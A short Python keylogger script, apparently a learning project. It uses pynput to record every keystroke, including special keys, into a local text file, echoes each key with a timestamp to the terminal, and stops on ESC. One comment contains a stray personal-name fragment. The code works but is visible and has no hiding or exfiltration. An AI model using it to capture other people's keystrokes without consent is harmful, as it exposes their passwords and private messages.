from pynput import keyboard
from datetime import datetime

# Defines the file to save the logs
log_file = "keylog.txt"

def on_press(key):
    # Get current timestamp for terminal output
    timestamp = datetime.now().strftime("%H:%M:%S")
    
    # Open file in append mode
    with open(log_file, 'a', encoding='utf-8') as f:
        try:
            # 1. Handle standard alphanumeric keys (a, b, 1, 2)my self somaiah kp
            char = key.char
            print(f"[{timestamp}] Key pressed: {char}")
            f.write(char)
            
        except AttributeError:
            # 2. Handle special keys (Space, Enter, Shift, etc.)
            if key == keyboard.Key.space:
                f.write(' ') # Add an actual space
                print(f"[{timestamp}] Key pressed: [SPACE]")
                
            elif key == keyboard.Key.enter:
                f.write('\n') # Move to a new line in the file
                print(f"[{timestamp}] Key pressed: [ENTER]")
                
            elif key == keyboard.Key.tab:
                f.write('\t')
                print(f"[{timestamp}] Key pressed: [TAB]")
                
            else:
                # For other keys (Shift, Ctrl, etc.), write them in brackets
                key_name = str(key).replace("Key.", "")
                f.write(f'[{key_name.upper()}]')
                print(f"[{timestamp}] Special Key: {key_name}")

def on_release(key):
    # 3. Feature to stop the script safely
    if key == keyboard.Key.esc:
        print("\n--- Esc pressed. Stopping Logger ---")
        return False

if __name__ == "__main__":
    print("--- Keylogger Started. Press ESC to stop ---")
    print(f"Logging to: {log_file}\n")
    
    # Setup the listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()